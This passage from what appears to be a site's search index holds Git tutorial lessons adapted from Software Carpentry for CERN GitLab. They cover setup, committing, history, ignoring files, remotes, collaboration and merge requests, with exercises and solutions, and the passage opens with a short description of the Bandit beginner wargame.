itself!\nBandit is a wargame aimed at absolute beginners.\nIt is organised in levels, each level requiring to having completed the previous one. Don’t panic if you have no clue how to proceed:\n- try using the manual, by typing man  (even man has a man) and then type q to quit the manual pages;\n- for shell built-in commands, try with help ;\n- ask Google or your favourite search engine!\n"},"git/":{"url":"git/","title":"Version control with Git","keywords":"","body":"Git\nAs stated on the project's official website git-scm.com,\nGit is a free and open source distributed version control system designed to\nhandle everything from small to very large projects with speed and\nefficiency.\nGreat so this means that here we have a tool that we can use free of charge\n(even better, we can look at and modify the source code) which allows us to\nversion our projects.

Some word\nprocessors let us deal with this a little better, such as Microsoft\nWord's Track Changes, Google Docs' version\nhistory, or LibreOffice's Recording and Displaying Changes.\nVersion control systems start with a base version of the document and\nthen save just the changes you made at each step of the way. You can\nthink of it as a tape: if you rewind the tape and start at the base\ndocument, then you can play back each change and end up with your\nlatest version.\n\nOnce you think of changes as separate from the document itself, you\ncan then think about \"playing back\" different sets of changes onto the\nbase document and getting different versions of the document. For\nexample, two users can make independent sets of changes based on the\nsame document.\n\nUnless there are conflicts, you can even play two sets of changes onto the same base document.\n\nA version control system is a tool that keeps track of these changes for us and\nhelps us version and merge our files. It allows you to\ndecide which changes make up the next version, called a\ncommit, and keeps useful metadata about them. The\ncomplete history of commits for a particular project and their metadata make up\na repository. Repositories can be kept in sync\nacross different computers facilitating collaboration among different people.\n The Long History of Version Control SystemsAutomated version control systems are nothing new.\nTools like RCS, CVS, or Subversion have been around since the early 1980s and are used by many large companies.\nHowever, many of these are now becoming considered as legacy systems due to various limitations in their capabilities.\nIn particular, the more modern systems, such as Git and Mercurial\nare distributed, meaning that they do not need a centralized server to host the repository.\nThese modern systems also include powerful merging tools that make it possible for multiple authors to work within\nthe same files concurrently.\n\n Paper Writing\nImagine you drafted an excellent paragraph for a paper you are writing, but later ruin it. How would you retrieve\nthe excellent version of your conclusion? Is it even possible?\n\nImagine you have 5 co-authors. How would you manage the changes and comments they make to your paper?\nIf you use LibreOffice Writer or Microsoft Word, what happens if you accept changes made using the\nTrack Changes option? Do you have a history of those changes?\n\n\n\n Key Points\nVersion control is like an unlimited 'undo'.\nVersion control also allows many people to work in parallel.\n\n\nCC BY 4.0 - Based on git-novice © 2016–2017 Software Carpentry Foundation\n"},"git/02-setup.html":{"url":"git/02-setup.html","title":"Setting Up Git","keywords":"","body":"Setting Up Git\n Learning Objectives\nConfigure git the first time it is used on a computer.\nUnderstand the meaning of the --global configuration flag.\n\n\nWhen we use Git on a new computer for the first time,\nwe need to configure a few things. Below are a few examples\nof configurations we will set as we get started with Git:\n\nour name and email address,\nto colorize our output,\nwhat our preferred text editor is,\nand that we want to use these settings globally (i.e. for every project)\n\nOn a command line, Git commands are written as git verb,\nwhere verb is what we actually want to do.

Therefore, it's best to create each new Git\nrepository in a separate directory. To be sure that there is no conflicting\nrepository in the directory, check the output of git status. If it looks\nlike the following, you are good to go to create a new repository as shown\nabove:\n$ git status\n\nfatal: Not a git repository (or any of the parent directories): .git\nNote that we can track files in directories within a Git:\n$ touch moon phobos deimos titan    # create moon files\n$ cd ..                             # return to planets directory\n$ ls moons                          # list contents of the moons directory\n$ git add moons/*                   # add all contents of planets/moons\n$ git status                        # show moons files in staging area\n$ git commit -m \"add moon files\"    # commit planets/moons to planets Git repository\n\nSimilarly, we can ignore (as discussed later) entire directories, such as the moons directory:\n$ nano .gitignore # open the .gitignore file in the texteditor to add the moons directory\n$ cat .gitignore # if you run cat afterwards, it should look like this:\nmoons\n\nTo recover from this little mistake, Dracula can just remove the .git\nfolder in the moons subdirectory. To do so he can run the following command from inside the 'moons' directory:\n$ rm -rf moons/.git\n\nBut be careful!

This is the reason why you will sometimes see .gitkeep files\nin otherwise empty directories. Unlike .gitignore, these files are not special\nand their sole purpose is to populate a directory so that Git adds it to\nthe repository. In fact, you can name such files anything you like.\n{:start=\"2\"}\n\nIf you create a directory in your Git repository and populate it with files,\nyou can add all files in the directory at once by:\n\ngit add \n\nTo recap, when we want to add changes to our repository,\nwe first need to add the changed files to the staging area\n(git add) and then commit the staged changes to the\nrepository (git commit):\n\n Choosing a Commit MessageWhich of the following commit messages would be most appropriate for the\nlast commit made to mars.txt?\n\n\"Changes\"\n\"Added line 'But the Mummy will appreciate the lack of humidity' to mars.txt\"\n\"Discuss effects of Mars' climate on the Mummy\"\n\n SolutionClick to expandAnswer 1 is not descriptive enough,\nand answer 2 is too descriptive and redundant,\nbut answer 3 is good: short but descriptive.\n\n Committing Changes to GitWhich command(s) below would save the changes of myfile.txt\nto my local Git repository?\n\n$ git commit -m \"my recent changes\"\n\n$ git init myfile.txt\n$ git commit -m \"my recent changes\"\n\n$ git add myfile.txt\n$ git commit -m \"my recent changes\"\n\n$ git commit -m myfile.txt \"my recent changes\"\n\n\n SolutionClick to expand\nWould only create a commit if files have already been staged.\nWould try to create a new repository.\nIs correct: first add the file to the staging area, then commit.\nWould try to commit a file \"my recent changes\" with the message myfile.txt.\n\n\n Committing Multiple FilesThe staging area can hold changes from any number of files\nthat you want to commit as a single snapshot.\n\nAdd some text to mars.txt noting your decision\nto consider Venus as a base\nCreate a new file venus.txt with your initial thoughts\nabout Venus as a base for you and your friends\nAdd changes from both files to the staging area,\nand commit those changes.\n\n SolutionClick to expandFirst we make our changes to the mars.txt and venus.txt files:\n$ nano mars.txt\n$ cat mars.txt\n\nMaybe I should start with a base on Venus.\n$ nano venus.txt\n$ cat venus.txt\n\nVenus is a nice planet and I definitely should consider it as a base.\nNow you can add both files to the staging area.

She has spent\n~ 1hr trying to fix it, with no luck...\nLuckily, she has been keeping track of her project's versions using Git! Which commands below will\nlet her recover the last committed version of her Python script called\ndata_cruncher.py?\n\n$ git checkout HEAD\n\n$ git checkout HEAD data_cruncher.py\n\n$ git checkout HEAD~1 data_cruncher.py\n\n$ git checkout  data_cruncher.py\n\nBoth 2 and 4\n\n\n\n Reverting a CommitJennifer is collaborating on her Python script with her colleagues and\nrealizes her last commit to the group repository is wrong and wants to\nundo it.  Jennifer needs to undo correctly so everyone in the group\nrepository gets the correct change.  git revert [wrong commit ID]\nwill make a new commit that undoes Jennifer's previous wrong\ncommit. Therefore git revert is different than git checkout [commit\nID] because checkout is for local changes not committed to the\ngroup repository.  Below are the right steps and explanations for\nJennifer to use git revert, what is the missing command?\n\n__ # Look at the git history of the project to find the commit ID\n\nCopy the ID (the first few characters of the ID, e.g. 0b1d055).\n\ngit revert [commit ID]\n\nType in the new commit message.\n\nSave and close\n\n\n\n Understanding Workflow and HistoryWhat is the output of cat venus.txt at the end of this set of commands?\n$ cd planets\n$ nano venus.txt #input the following text: Venus is beautiful and full of love\n$ git add venus.txt\n$ nano venus.txt #add the following text: Venus is too hot to be suitable as a base\n$ git commit -m \"Comment on Venus as an unsuitable base\"\n$ git checkout HEAD venus.txt\n$ cat venus.txt #this will print the contents of venus.txt to the screen\n\n1.\nVenus is too hot to be suitable as a base\n2.\nVenus is beautiful and full of love\n3.\nVenus is beautiful and full of love\nVenus is too hot to be suitable as a base\n4.\nError because you have changed venus.txt without committing the changes\n SolutionClick to expandLine by line:\n$ cd planets\n\nEnters into the 'planets' directory\n$ nano venus.txt #input the following text: Venus is beautiful and full of love\n\nWe created a new file and wrote a sentence in it, but the file is not tracked by git.\n$ git add venus.txt\n\nNow the file is staged. The changes that have been made to the file until now will be committed in the next commit.\n$ nano venus.txt #add the following text: Venus is too hot to be suitable as a base\n\nThe file has been modified.

The changes that were not staged (Venus is too hot to be suitable as a base) have not. Our local working copy is different than the copy in our local repository.\n$ git checkout HEAD venus.txt\n\nWith checkout we discard the changes in the working directory so that our local copy is exactly the same as our HEAD, the most recent commit.\n$ cat venus.txt #this will print the contents of venus.txt to the screen\n\nIf we print venus.txt we will get answer 2.\n\n Checking Understanding of `git diff`Consider this command: git diff HEAD~3 mars.txt. What do you predict this command\nwill do if you execute it? What happens when you do execute it? Why?\nTry another command, git diff [ID] mars.txt, where [ID] is replaced with\nthe unique identifier for your most recent commit. What do you think will happen,\nand what does happen?\n\n Getting Rid of Staged Changesgit checkout can be used to restore a previous commit when unstaged changes have\nbeen made, but will it also work for changes that have been staged but not committed?\nMake a change to mars.txt, add that change, and use git checkout to see if\nyou can remove your change.\n\n Explore and Summarize HistoriesExploring history is an important part of git, often it is a challenge to find\nthe right commit ID, especially if the commit is from several months ago.\nImagine the planets project has more than 50 files.\nYou would like to find a commit with specific text in mars.txt is modified.\nWhen you type git log, a very long list appeared,\nHow can you narrow down the search?\nRecorded that the git diff command allow us to explore one specific file,\ne.g. git diff mars.txt. We can apply the similar idea here.\n$ git log mars.txt\n\nUnfortunately some of these commit messages are very ambiguous e.g. update files.\nHow can you search through these files?\nBoth git diff and git log are very useful and they summarize different part of the history for you.\nIs that possible to combine both? Let's try the following:\n$ git log --patch mars.txt\n\nYou should get a long list of output, and you should be able to see both commit messages and the difference between each commit.\nQuestion: What does the following command do?\n$ git log --patch HEAD~3 *.txt\n\n\n Key Points\ngit diff displays differences between commits.\ngit checkout recovers old versions of files.\n\n\nCC BY 4.0 - Based on git-novice © 2016–2017 Software Carpentry Foundation\n"},"git/06-ignore.html":{"url":"git/06-ignore.html","title":"Ignoring Things","keywords":"","body":"Ignoring Things\n Learning Objectives\nConfigure Git to ignore specific files.\nExplain why ignoring files can be useful.\n\n\nWhat if we have files that we do not want Git to track for us,\nlike backup files created by our editor\nor intermediate files created during data analysis.\nLet's create a few dummy files:\n$ mkdir results\n$ touch a.dat b.dat c.dat results/a.out results/b.out\n\nand see what Git says:\n$ git status\n\nOn branch master\nUntracked files:\n  (use \"git add ...\" to include in what will be committed)\n\n    a.dat\n    b.dat\n    c.dat\n    results/\nnothing added to commit but untracked files present (use \"git add\" to track)\nPutting these files under version control would be a waste of disk space.\nWhat's worse,\nhaving them all listed could distract us from changes that actually matter,\nso let's tell Git to ignore them.\nWe do this by creating a file in the root directory of our project called .gitignore:\n$ nano .gitignore\n$ cat .gitignore\n\n*.dat\nresults/\nThese patterns tell Git to ignore any file whose name ends in .dat\nand everything in the results directory.\n(If any of these files were already being tracked,\nGit would continue to track them.)\nOnce we have created this file,\nthe output of git status is much cleaner:\n$ git status\n\nOn branch master\nUntracked files:\n  (use \"git add ...\" to include in what will be committed)\n\n    .gitignore\nnothing added to commit but untracked files present (use \"git add\" to track)\nThe only thing Git notices now is the newly-created .gitignore file.\nYou might think we wouldn't want to track it,\nbut everyone we're sharing our repository with will probably want to ignore\nthe same things that we're ignoring.\nLet's add and commit .gitignore:\n$ git add .gitignore\n$ git commit -m \"Add the ignore file\"\n$ git status\n\n# On branch master\nnothing to commit, working directory clean\nAs a bonus, using .gitignore helps us avoid accidentally adding to the\nrepository files that we don't want to track:\n$ git add a.dat\n\nThe following paths are ignored by one of your .gitignore files:\na.dat\nUse -f if you really want to add them.\nIf we really want to override our ignore settings,\nwe can use git add -f to force Git to add something.

We already have most of the machinery we need to do this; the\nonly thing missing is to copy changes from one repository to another.\nSystems like Git allow us to move work between any two repositories.  In\npractice, though, it's easiest to use one copy as a central hub, and to keep it\non the web rather than on someone's laptop.  Most programmers use hosting\nservices like GitHub, BitBucket or\nGitLab to hold those master copies. All of these services\nare the same from the perspective of the git command line however each\nprovider's website offers slightly different features. In this lesson we will\nuse CERN's instance of GitLab. This is the similar to\nthe public GitLab instance except it is hosted by CERN and is integrated with\nvarious CERN services such as Single Sign On\nand JIRA.\nLet's start by sharing the changes we've made to our current project with the\nworld.  Log in to CERN GitLab, then click on the +\nicon in the top right and create a new project called planets:\n\nName your repository \"planets\" and then click \"Create project\":\n\nHere we can see one of the main reasons why you might want to use GitLab at CERN\ninstead of an external service: every CERN user can create a private\nrepository, meaning its access can be restricted to the persons you want.\nExternal services such as GitHub only allow you to create\npublic repositories unless you pay for it. Note\nthat private repositories are very useful when collaborating for a paper.\nAs soon as the repository is created, GitLab displays a page with a URL and some\ninformation on how to configure your local repository:\n\nThis is roughly equivalent to perform the following on CERN's servers:\n$ mkdir planets\n$ cd planets\n$ git init --bare\n\nOur local repository still contains our earlier work on mars.txt, but the\nremote repository on CERN GitLab doesn't contain any files yet:\n\nThe next step is to connect the two repositories.  We do this by making the\nGitLab repository a remote for the local repository.\nThe home page of the repository on GitLab includes the string we need to\nidentify it:\n\nClick on the 'SSH' link to change the protocol from\nKRB5 to SSH and then copy that URL from the browser, go into the local planets\nrepository, and run this command:\n$ git remote add origin ssh://git@gitlab.cern.ch:7999/vlad/planets.git\n\nMake sure to use the URL for your repository rather than Vlad's: the only\ndifference should be your username instead of vlad.\nWe can check that the command has worked by running git remote -v:\n$ git remote -v\n\norigin  ssh://git@gitlab.cern.ch:7999/vlad/planets.git (fetch)\norigin  ssh://git@gitlab.cern.ch:7999/vlad/planets.git (push)\nThe name origin is a local nickname for your remote repository. We could use\nsomething else if we wanted to, but origin is by far the most common choice.\nOnce the nickname origin is set up, this command will push the changes from\nour local repository to the repository on GitLab:\n$ git push origin master\n\nCounting objects: 9, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (6/6), done.\nWriting objects: 100% (9/9), 821 bytes, done.\nTotal 9 (delta 2), reused 0 (delta 0)\nTo ssh://gitlab.cern.ch:7999/vlad/planets.git\n * [new branch]      master -> master\nBranch master set up to track remote branch master from origin.\nOur local and remote repositories are now in this state:\n\n The '-u' FlagYou may see a -u option used with git push in some documentation.  This\noption is synonymous with the --set-upstream-to option for the git branch\ncommand, and is used to associate the current branch with a remote branch so\nthat the git pull command can be used without any arguments. To do this,\nsimply use git push -u origin master once the remote has been set up.\n\nWe can pull changes from the remote repository to the local one as well:\n$ git pull origin master\n\nFrom https://gitlab.cern.ch/vlad/planets\n * branch            master     -> FETCH_HEAD\nAlready up-to-date.\nPulling has no effect in this case because the two repositories are already\nsynchronized.  If someone else had pushed some changes to the repository on\nGitLab, though, this command would download them to our local repository.\n GitLab GUIBrowse to your planets repository on GitLab.\nUnder the \"Project\" tab, find and click on the text that says \"XX commits\"\n(where \"XX\" is some number).\nHover over, and click on, the three buttons to the right of each commit.\nWhat information can you gather/explore from these buttons?\nHow would you get that same information in the shell?\n SolutionClick to expandThe button with the picture of a clipboard copies the full\nidentifier of the commit to the clipboard. In the shell, git log will show\nyou the full commit identifier for each commit.\nWhen you click on the commit message, you'll see all of the changes that were\nmade in that particular commit. Green shaded lines indicate additions and red\nones removals. In the shell we can do the same thing with git diff. In\nparticular, git diff ID1..ID2 where ID1 and ID2 are commit identifiers\n(e.g. git diff a3bf1e5..041e637) will show the differences between those\ntwo commits.\nThe right-most button (\"Browse files\") lets you view all of the files in the repository at the\ntime of that commit. To do this in the shell, we'd need to checkout the\nrepository at that particular time. We can do this with git checkout ID\nwhere ID is the identifier of the commit we want to look at. If we do this, we\nneed to remember to put the repository back to the right state afterwards!\n\n GitLab TimestampCreate a remote repository on GitLab.  Push the contents of your local\nrepository to the remote.  Make changes to your local repository and push\nthese changes.  Go to the repo you just created on GitLab and check the\ntimestamps of the files.  How does\nGitLab record times, and why?\n SolutionClick to expandGitLab displays timestamps in a human readable relative format (i.e.\n\"22 hours ago\" or \"three weeks ago\"). However, if you hover over the timestamp,\nyou can see the exact time at which the last change to the file occurred.\n\n Push vs. CommitIn this lesson, we introduced the \"git push\" command.\nHow is \"git push\" different from \"git commit\"?\n SolutionClick to expandWhen we push changes, we're interacting with a remote repository to update it\nwith the changes we've made locally (often this corresponds to sharing the\nchanges we've made with others). Commit only updates your local repository.\n\n Fixing Remote SettingsIt happens quite often in practice that you made a typo in the\nremote URL. This exercise is about how to fix this kind of issues.\nFirst start by adding a remote with an invalid URL:\ngit remote add broken https://gitlab.cern.ch/this/url/is/invalid\nDo you get an error when adding the remote? Can you think of a\ncommand that would make it obvious that your remote URL was not\nvalid? Can you figure out how to fix the URL (tip: use git remote\n-h)? Don't forget to clean up and remove this remote once you are\ndone with this exercise.\n SolutionClick to expandWe don't see any error message when we add the remote (adding the remote tells\ngit about it, but doesn't try to use it yet). As soon as we try to use\ngit push we'll see an error message. The command git remote set-url\nallows us to change the remote's URL to fix it.\n\n Key Points\nA local Git repository can be connected to one or more remote repositories.\nUse the SSH protocol to connect to remote repositories.\ngit push copies changes from a local repository to a remote repository.\ngit pull copies changes from a remote repository to a local repository.\n\n\nCC BY 4.0 - Based on git-novice © 2016–2017 Software Carpentry Foundation\n"},"git/08-share.html":{"url":"git/08-share.html","title":"Sharing a repository with others","keywords":"","body":"Sharing a repository with others\n Learning Objectives\nClone a remote repository.\nCollaborate pushing to a common repository.\n\n\nFor the next step, get into pairs.  One person will be the \"Owner\" and the other\nwill be the \"Collaborator\". The goal is that the Collaborator add changes into\nthe Owner's repository. We will switch roles at the end, so both persons will\nplay Owner and Collaborator.\n Practicing By YourselfIf you're working through this lesson on your own, you can carry on by opening\na second terminal window.\nThis window will represent your partner, working on another computer. You\nwon't need to give anyone access on GitLab, because both 'partners' are you.\n\nThe Owner needs to give the Collaborator access.  On GitLab, click the\n\"Members\" tab at the top, and enter your partner's username.\n\n Understanding GitLab permissionsGitLab permission levels might be complicated to understand. This\ntable might come in handy.\n\nNext, the Collaborator needs to download a copy of the Owner's repository to\nher machine. This is called \"cloning a repo\". To clone the Owner's repo into\nher Desktop folder, the Collaborator enters:\n$ git clone ssh://git@gitlab.cern.ch:7999/vlad/planets.git ~/Desktop/vlad-planets\n\nReplace vlad with the Owner's username.\n\nThe Collaborator can now make a change in her clone of the Owner's repository,\nexactly the same way as we've been doing before:\n$ cd ~/Desktop/vlad-planets\n$ nano pluto.txt\n$ cat pluto.txt\n\nIt is so a planet!\n$ git add pluto.txt\n$ git commit -m \"Add notes about Pluto\"\n\n 1 file changed, 1 insertion(+)\n create mode 100644 pluto.txt\nThen push the change to the Owner's repository on GitLab:\n$ git push origin master\n\nCounting objects: 4, done.\nDelta compression using up to 4 threads.\nCompressing objects: 100% (2/2), done.\nWriting objects: 100% (3/3), 306 bytes, done.\nTotal 3 (delta 0), reused 0 (delta 0)\nTo ssh://gitlab.cern.ch:7999/vlad/planets.git\n   9272da5..29aba7c  master -> master\nNote that we didn't have to create a remote called origin: Git uses this name\nby default when we clone a repository.  (This is why origin was a sensible\nchoice earlier when we were setting up remotes by hand.)\nTake a look to the Owner's repository on its GitLab website now (maybe you need\nto refresh your browser.) You should be able to see the new commit made by the\nCollaborator.\nTo download the Collaborator's changes from GitLab, the Owner now enters:\n$ git pull origin master\n\nremote: Counting objects: 4, done.\nremote: Compressing objects: 100% (2/2), done.\nremote: Total 3 (delta 0), reused 3 (delta 0)\nUnpacking objects: 100% (3/3), done.\nFrom ssh://gitlab.cern.ch:7999/vlad/planets.git\n * branch            master     -> FETCH_HEAD\nUpdating 9272da5..29aba7c\nFast-forward\n pluto.txt | 1 +\n 1 file changed, 1 insertion(+)\n create mode 100644 pluto.txt\nNow the three repositories (Owner's local, Collaborator's local, and Owner's on\nGitLab) are back in sync.\n A Basic Collaborative WorkflowIn practice, it is good to be sure that you have an updated version of the\nrepository you are collaborating on, so you should git pull before making\nour changes. The basic collaborative workflow would be:\n\nupdate your local repo with git pull origin master,\nmake your changes and stage them with git add,\ncommit your changes with git commit -m, and\nupload the changes to GitLab with git push origin master\n\nIt is better to make many commits with smaller changes rather than\nof one commit with massive changes: small commits are easier to\nread and review.\n\n Switch Roles and RepeatSwitch roles and repeat the whole process.\n\n Review ChangesThe Owner push commits to the repository without giving any information\nto the Collaborator. How can the Collaborator find out what has changed with\ncommand line? And on GitLab?\n SolutionClick to expandOn the command line, the Collaborator can use git fetch origin master\nto get the remote changes into the local repository, but without merging\nthem. Then by running git diff master origin/master the Collaborator\nwill see the changes output in the terminal.\nOn GitLab, the Collaborator can go to their own fork of the repository and\nlook right above the light blue latest commit bar for a gray bar saying\n\"This branch is 1 commit behind Our-Respository:master.\" On the far right of\nthat gray bar is a Compare icon and link. On the Compare page the\nCollaborator should change the base fork to their own repository, then click\nthe link in the paragraph above to \"compare across forks\", and finally\nchange the head fork to the main repository. This will show all the commits\nthat are different.\n\n Comment Changes in GitLabThe Collaborator has some questions about one line change made by the Owner and\nhas some suggestions to propose.\nWith GitLab, it is possible to comment the diff of a commit. Over the line of\ncode to comment, a blue comment icon appears to open a comment window.\nThe Collaborator posts its comments and suggestions using GitLab interface.\n\n Version History, Backup, and Version ControlSome backup software can keep a history of the versions of your files. They also\nallows you to recover specific versions.

We will also see how this approach turns\nout to be useful even when working on small projects with only three or four\ncontributors.\nThe most naive approach to Git collaboration is what we have previously\nseen:\n\nWe have a single remote repository\nThis repository has one or more owners who decide who can contribute\nContributors can push their changes directly on the repository\n\nGitHub has introduced the concept of Pull Requests,\nwhich has been subsequently adopted by its most famous clone,\nGitLab.\nWhat is a Pull (or Merge) Request\nPull Requests are a way to propose changes to a remote repository without\nhaving write permissions to it, and therefore without pushing to it directly.\nNote that GitLab (which we are going to use for the following examples) uses the\nterm \"Merge Requests\" but the concept stays the same.\nThe general idea behind Pull Requests is:\n\nI would like to collaborate to a repository by adding some code\nI push this code somewhere\nI submit this code for a review to the owners of the original project (this is\nwhere I open a Pull Request)\nOwners will decide whether to accept or reject my changes, and a Web-based\ninterface allows people to comment and discuss\n\n Why are they called Pull Requests?We have seen in a previous lesson that the act of\nincorporating remote changes into a repository is called \"pulling\" and it is\nachieved by variations of the command git pull.\nProjects using Pull Requests do not allow people to git push code to them.\nInstead, what you are doing is requesting them to pull your code instead,\ntherefore the name.\n\n Pull Requests are not a builtin Git featureThe concept of Pull Requests leverages certain features of Git, but it's not\npart of the git tool itself: it depends on the hosting platform you use.\n\nFork the original project repository\nThe first step when collaborating to a project is to create a fork\nof the remote repository. Let's see exactly what it means with an example.\nConnect to our example repository using a Web browser:\n\nhttps://gitlab.cern.ch/starter-kit-scratch/starter-kit-example\n\nand click on the \"Fork\" button:\n\nIf you have played already with GitLab groups you might have several fork\ndestinations, if so, just select your user:\n\nYour GitLab account will now contain a repository with the same name as the\noriginal, starter-kit-example.\nAt this point, CERN GitLab contains several copies of the same repositories:\nthe main one, and all the forks you have just created. Those copies are remote\nclones for now, as they are not on your laptop yet.\nThe main feature of your fork is that you (and by default you only) have write\npermissions to it. You cannot directly push to the original repository, but\nyou can write to your fork.\n Forks are independentWhen you create a fork, you make a snapshot of the original repository at a\ngiven moment in time. From that point on, the fork is independent from both the\noriginal repository and any forks made by other users.\n\nClone a remote project and its fork\nNow it is time to open your terminal and clone the remote project. As we have\nalready seen we can use the SSH URL for cloning the project:\n$ mkdir test_merge_requests/\n$ cd test_merge_requests/\n$ git clone ssh://git@gitlab.cern.ch:7999/starter-kit-scratch/starter-kit-example.git\n\nCloning into 'starter-kit-example'...\nremote: Counting objects: 3, done.\nremote: Compressing objects: 100% (2/2), done.\nremote: Total 3 (delta 0), reused 0 (delta 0)\nReceiving objects: 100% (3/3), done.\nNow putting into practice what we have already learnt let's add\nour fork as a remote, it will have the same URL as the main repository except\nstarter-kit-scratch is replaced with your CERN username:\ncd starter-kit-example/\ngit remote add YOUR_CERN_USERNAME ssh://git@gitlab.cern.ch:7999/YOUR_CERN_USERNAME/starter-kit-example.git\n\n What are my remotes now?\nHow many remotes do you have now in your repository?\nWhat are their names?\n\n SolutionClick to expandYou can verify what are your remotes by using the git remote command:\n$ git remote -v\n\ndberzano    ssh://git@gitlab.cern.ch:7999/dberzano/starter-kit-example.git (fetch)\ndberzano    ssh://git@gitlab.cern.ch:7999/dberzano/starter-kit-example.git (push)\norigin    ssh://git@gitlab.cern.ch:7999/starter-kit-scratch/starter-kit-example.git (fetch)\norigin    ssh://git@gitlab.cern.ch:7999/starter-kit-scratch/starter-kit-example.git (push)\nYou now have two remotes: the default one, corresponding to the upstream\nrepository, is called origin and you have added it when you have cloned the\nrepository. The second one is named after your CERN account and you have created\nit explicitly with git remote add.\n\nSync your local repository with remote changes\nYou are now ready to start working on your new feature on your laptop. First off\nsince you are using different remotes, make sure your local Git working\ndirectory is up-to-date with the upstream (i.e. the \"main\", or origin)\nrepository.\nIf you don't have any pending local change, you can do:\n$ git pull\n\nSince your current branch \"tracks\" by default the corresponding remote branch\non the main (origin) repository, the git pull command will by default do the\nright thing. This is equivalent of explicitly telling git to fetch changes\nfrom origin:\n$ git pull origin\n\n Syncing using the nuclear optionIn some cases you might end up with your working directory (and/or branch)\n\"messed up\" and the git pull command will not work seamlessly. If you are sure\nyou are not going to lose anything important, you can simply reset your current\nworking directory by ignoring any local modification and destroying it:\n$ git fetch --all  # make local git aware of what changed remotely\n$ git reset --hard origin/master  # lose any local modification\n$ git clean -fxd  # get rid of any extra files not under version control\n\nYou should be very careful about using the git reset and git clean\ncommands, but they are very useful when your working area got messed up somehow.\n\nImplement your new feature\nYou can now implement your new \"feature\" by adding a bunch of files with some\nrandom content to your local repository. As an exercise, you can try to add a\nfile named after your CERN username:\necho \"My name is Firstname Lastname\" > YOUR_CERN_USERNAME.txt\n\nReplace YOUR_CERN_USERNAME with your CERN username to avoid conflicts.\nYou can now commit the changes:\n$ git add --all -v\n$ git commit -m 'Add user info for YOUR_CERN_USERNAME'\n\n What have I done?\nWhat did you do with git add?\nWhat did you do with git commit?\nWhy is the commit message appropriate?\nWhere are my changes now?\n\n SolutionClick to expandgit add --all adds all untracked/modified files to the \"staging area\", that\nis: the area containing the files which will be part of the next commit. The\n-v (as in verbose) switch is useful to spot unwanted additions, as it\nprints out every added file.\ngit commit creates a commit, whose message is appropriate as it is shorter than\n50 characters and meaningful, in other words it's concise.\nYour commit is only on your laptop only and it is not yet available in your\nfork, or on the upstream repository.\n\nPush changes\nWithout further ado let's push:\n$ git push\n\nUnfortunately it does not work (your message might actually be different):\nCounting objects: 3, done.\nDelta compression using up to 8 threads.\nCompressing objects: 100% (2/2), done.\nWriting objects: 100% (3/3), 316 bytes | 316.00 KiB/s, done.\nTotal 3 (delta 0), reused 0 (delta 0)\nremote: GitLab: You are not allowed to push code to protected branches on this project.\nTo ssh://gitlab.cern.ch:7999/starter-kit-scratch/starter-kit-example.git\n !

Before opening\nthe Pull Request let's check the status of the remote repositories.\n Status of remote repositoriesHow do you use git log to see exactly what the two remote repositories\n(origin, and your fork) contain?\n SolutionClick to expandWe use the --decorate option to show local and remote branches and tags (-10\nis to limit the history to 10 commits):\n$ git log -10 --oneline --graph --decorate\n\nThis is the output (most recent commits are on top):\n* 256c9b6 (HEAD -> master, dberzano/master) Add user info for dberzano\n* 764051d (origin/master, origin/HEAD) Add initial README\nSo you will see that:\n\nthe main repository (origin/master) is behind yours\nyour local repository (master) and your remote fork (dberzano/master) are\nin sync and contain the commit you've just authored\n\n\nCreate a Pull (or Merge) Request\nAs we have said before, Pull Requests are not part of Git but they depend on\nthe provider hosting your Git repositories. On GitLab you need to point your\nWeb browser to your repository:\n\nhttps://gitlab.cern.ch/YOUR_CERN_USERNAME/starter-kit-example\n\nThen click on the + (plus) button and select New merge request:\n\nOn the next screen, select master as Source branch:\n\nthen click the green Compare branches and continue button. The next screen\nallows you to review the changes graphically (you need to go at the bottom of\nthe page and click the Changes tab):\n\nIf the changes look good to you, assign a title to your Merge Request, and an\nextended description. You should follow the same policies you use for writing\ncommit messages:\n\nkeep the Title below 50 characters (well, you don't need to count, but do\nyour best to keep it short!),\nadd any extra information in the Description field.\n\n Automatic Pull Request title and descriptionIf your Pull Request has only one commit, the Title and Description\nfields will be automatically filled for you.\n\n\nWhen you are ready to proceed, click on the big green Submit merge request\nbutton.\nNow, sit back and relax!\nDiscussing, amending, retiring a Merge Request\nOnce a Merge Request is opened the repository owners are notified (usually via\nemail), and they (or even somebody else, depending on the repository's\npermissions) can add comments and requests before accepting your changes.\nMerge Requests are each given a sequential number. The first ever merge request\non the example respository can be found at:\n\nhttps://gitlab.cern.ch/starter-kit-scratch/starter-kit-example/merge_requests/1\n\nThis is how a comment appears, and how you can reply to it:\n\nWhen you are ready just click on the Comment button.\nIn our example, we have realized that we wanted to add something more to the\nMerge Request before proceeding. Doing so is as simple as authoring and pushing\nmore commits.\nLet's go back to our local working directory, edit the file\nYOUR_CERN_USERNAME.txt and add a line to it:\n$ echo \"I hereby certify that this information is true.\" >> YOUR_CERN_USERNAME.txt\n\nNow commit:\n$ git commit -a -m 'Add information certification'\n\n[master d09c134] Add information certification\n 1 file changed, 1 insertion(+)\n...and finally push (once again, remember to do it to your remote):\n$ git push YOUR_CERN_USERNAME\n\nCounting objects: 3, done.\nDelta compression using up to 8 threads.\nCompressing objects: 100% (3/3), done.\nWriting objects: 100% (3/3), 359 bytes | 359.00 KiB/s, done.\nTotal 3 (delta 0), reused 0 (delta 0)\nTo ssh://gitlab.cern.ch:7999/dberzano/starter-kit-example.git\n   256c9b6..d09c134  master -> master\nVoilà, it's done: you have just added more commits to your Merge Request! Let's\nlook on the Web at the commits you have added. Go to the Merge Request page\nand click on the Commits tab at the bottom, here is a direct link for the example:\n\nhttps://gitlab.cern.ch/starter-kit-scratch/starter-kit-example/merge_requests/1/commits\n\n\n How come has this worked?Opening a Merge/Pull Request does not mean creating a static snapshot of your\nworking area at the time when you have opened it; instead, your working area\n(i.e. your branch on your remote, note that we are only using one branch\ncalled master, which is the default, for simplicity) is dynamically linked to\nthe Merge Request. The link disappears the moment the Merge Request is closed,\nor accepted.\n\nAdding commits to an existing Merge Request is the very essence of using Merge\nRequests: you submit your content for scrutiny, and reviewers will say what\nthey think before accepting it, giving you the ability to amend things as you\ngo.\nIf you or the maintainers of the project are not happy with a Pull Request it\ncan be retired by clicking on the orange Close merge request button on top\nof the page:\n\nAccepting a Pull Request\nWhen a Merge Request looks good, the repository owners will click on the\nMerge button:\n\nYour code is then finally included upstream. On your local repository, if you\nwant to work on a new feature, you can simply start over by fetching remote\nchanges first as explained earlier.\nThe social side of coding\nUsing Pull Requests can seem overly complicated at first, but they are a 